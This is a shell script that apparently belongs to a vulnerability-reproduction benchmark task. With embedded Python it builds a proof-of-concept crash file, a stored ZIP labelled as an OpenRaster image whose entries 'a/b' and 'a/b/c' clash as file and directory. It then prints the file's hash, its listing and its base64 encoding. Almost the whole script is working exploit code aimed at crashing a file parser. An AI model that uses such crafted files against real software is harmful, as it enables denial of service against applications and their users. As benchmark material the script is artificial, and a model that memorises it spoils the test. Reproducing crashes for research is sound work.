set -eu
rm -f /CybinGym_workdir/empty.bin /CybinGym_workdir/poc /CybinGym_workdir/poc_crash
python3 - <<'PY'
from pathlib import Path
from zipfile import ZIP_STORED, ZipFile, ZipInfo

output = Path('/CybinGym_workdir/poc_crash')
entries = (
    ('mimetype', b'image/openraster'),
    ('a/b', b''),
    ('a/b/c', b''),
)
with ZipFile(output, 'w') as archive:
    for name, data in entries:
        info = ZipInfo(name, date_time=(1980, 1, 1, 0, 0, 0))
        info.compress_type = ZIP_STORED
        info.create_system = 0
        info.external_attr = 0
        archive.writestr(info, data)
PY
printf '%s\n' '--- final artifact ---'
stat -c 'path=%n size=%s mode=%a type=%F' /CybinGym_workdir/poc_crash
sha256sum /CybinGym_workdir/poc_crash
file /CybinGym_workdir/poc_crash
unzip -lv /CybinGym_workdir/poc_crash
printf '%s' 'base64='
base64 -w0 /CybinGym_workdir/poc_crash
printf '\n'
